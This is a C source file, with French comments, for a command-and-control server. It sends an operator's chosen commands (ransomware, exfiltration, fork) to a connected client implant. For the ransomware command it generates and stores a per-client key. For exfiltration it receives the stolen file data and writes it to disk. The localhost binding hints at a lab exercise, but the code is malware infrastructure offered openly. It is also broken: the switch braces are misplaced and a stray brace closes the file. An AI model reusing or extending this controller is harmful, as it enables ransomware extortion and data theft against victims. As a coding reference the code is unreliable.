#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "gener.h"
#include "stock.h"

#define PORT 4242  // le port du serveur
#define BACKLOG 10 // nombre max de demandes de connexion

int main()
{
    struct sockaddr_in sa;
    int socket_fd, client_fd;
    struct sockaddr_storage client_addr;
    socklen_t addr_size;
    char buffer[BUFSIZ];
    int bytes_read;

    // Préparer l'adresse et le port pour la socket du serveur
    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;                     // IPv4
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // 127.0.0.1
    sa.sin_port = htons(PORT);

    // Créer le socket
    socket_fd = socket(sa.sin_family, SOCK_STREAM, 0);
    if (socket_fd == -1)
    {
        perror("socket");
        return 1;
    }

    // Associer le socket à l'adresse et au port
    if (bind(socket_fd, (struct sockaddr *)&sa, sizeof sa) != 0)
    {
        perror("bind");
        close(socket_fd);
        return 2;
    }

    // Écouter les connexions entrantes
    if (listen(socket_fd, BACKLOG) != 0)
    {
        perror("listen");
        close(socket_fd);
        return 3;
    }

    printf("Server is listening on port %d...\n", PORT);

    while (1)
    {
        // Accepter une connexion entrante
        addr_size = sizeof client_addr;
        client_fd = accept(socket_fd, (struct sockaddr *)&client_addr, &addr_size);
        if (client_fd == -1)
        {
            perror("accept");
            continue;
        }

        printf("Client connected.\n");

        // Réception de l'identifiant du client
        bytes_read = recv(client_fd, buffer, BUFSIZ - 1, 0);
        if (bytes_read <= 0)
        {
            perror("recv");
            close(client_fd);
            continue;
        }

        buffer[bytes_read] = '\0'; // Terminer la chaîne reçue
        printf("Client identifier received: \"%s\"\n", buffer);

        // Affichage du menu interactif
        while (1)
        {
            printf("\nSelect a command to send to the client:\n");
            printf("1. ransomware\n");
            printf("2. exfiltration\n");
            printf("3. fork\n");
            printf("4. out\n");
            printf("5. quit (disconnect client)\n");
            printf("Choice: ");

            int choice;
            scanf("%d", &choice);
            getchar(); // Consommer le '\n' laissé par scanf

            const char *command = NULL;

            switch (choice)
            {
            case 1:
                command = "ransomware";

                if (send(client_fd, command, strlen(command), 0) == -1)
                {
                    perror("send");
                    break;
                }
                printf("Command sent: %s\n", command);
                char ack[BUFSIZ];
                int bytes_read = recv(client_fd, ack, sizeof(ack) - 1, 0);
                if (bytes_read <= 0)
                {
                    if (bytes_read == 0)
                        printf("Client disconnected while waiting for acknowledgment.\n");
                    else
                        perror("recv");
                    break;
                }
                ack[bytes_read] = '\0'; // Terminer la chaîne reçue

                // Vérifier si l'accusé de réception correspond à "Command received"
                if (strcmp(ack, "Command received") == 0)
                {
                    printf("Acknowledgment received: %s\n", ack);

                    char *random_string = gener(16);
                    send(client_fd, random_string, strlen(random_string), 0);
                    stock(random_string, buffer);
                    break;
                case 2:
                    command = "exfiltration";
                    break;
                case 3:
                    command = "fork";
                    break;
                case 4:
                    command = "out";
                    break;
                case 5:
                    command = "quit";
                    break;
                default:
                    printf("Invalid choice. Please select a valid option.\n");
                    continue;
                }

                // Envoyer la commande au client
                if (send(client_fd, command, strlen(command), 0) == -1)
                {
                    perror("send");
                    break;
                }

                printf("Command sent: %s\n", command);

                // Si la commande est "quit", on déconnecte le client
                if (strcmp(command, "quit") == 0)
                {
                    printf("Disconnecting client...\n");
                    break;
                }
            }

            if (strcmp(command, "exfiltration") == 0)
            {
                // Fichier où les données seront sauvegardées
                FILE *output_file = fopen("loreemtoextract_received.txt", "wb");
                if (!output_file)
                {
                    perror("Erreur lors de l'ouverture du fichier de sortie");
                    break;
                }

                // Réception des blocs de données envoyés par le client
                while ((bytes_read = recv(client_fd, buffer, BUFSIZ, 0)) > 0)
                {
                    // Écrire les données dans le fichier
                    if (fwrite(buffer, sizeof(char), bytes_read, output_file) != bytes_read)
                    {
                        perror("Erreur lors de l'écriture dans le fichier");
                        break;
                    }
                    printf("Bloc reçu et écrit dans le fichier.\n");
                }

                if (bytes_read == -1)
                {
                    perror("Erreur de réception des données");
                }

                // Fermer le fichier après réception
                fclose(output_file);
            }
        }

        close(client_fd);
        printf("Client connection closed.\n");
    }

    close(socket_fd);
    return 0;
}
}